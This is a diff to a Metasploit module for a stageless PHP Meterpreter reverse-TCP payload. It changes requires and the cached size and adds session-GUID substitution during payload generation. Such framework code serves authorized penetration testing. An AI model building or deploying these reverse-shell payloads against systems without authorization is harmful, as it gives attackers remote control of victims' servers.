@@ -1,9 +1,8 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'msf/core/handler/reverse_tcp'
 require 'msf/core/payload/php/reverse_tcp'
 require 'msf/base/sessions/meterpreter_php'
@@ -12,7 +11,7 @@ require 'msf/base/sessions/meterpreter_options'
 
 module MetasploitModule
 
-  CachedSize = 26803
+  CachedSize = 30658
 
   include Msf::Payload::Single
   include Msf::Payload::Php::ReverseTcp
@@ -38,7 +37,11 @@ module MetasploitModule
 
     uuid = generate_payload_uuid
     bytes = uuid.to_raw.chars.map { |c| '\x%.2x' % c.ord }.join('')
-    met = met.sub("\"PAYLOAD_UUID\", \"\"", "\"PAYLOAD_UUID\", \"#{bytes}\"")
+    met = met.sub(%q|"PAYLOAD_UUID", ""|, %Q|"PAYLOAD_UUID", "#{bytes}"|)
+
+    # Stageless payloads need to have a blank session GUID
+    session_guid = '\x00' * 16
+    met = met.sub(%q|"SESSION_GUID", ""|, %Q|"SESSION_GUID", "#{session_guid}"|)
 
     met.gsub!(/#.*$/, '')
     met = Rex::Text.compress(met)
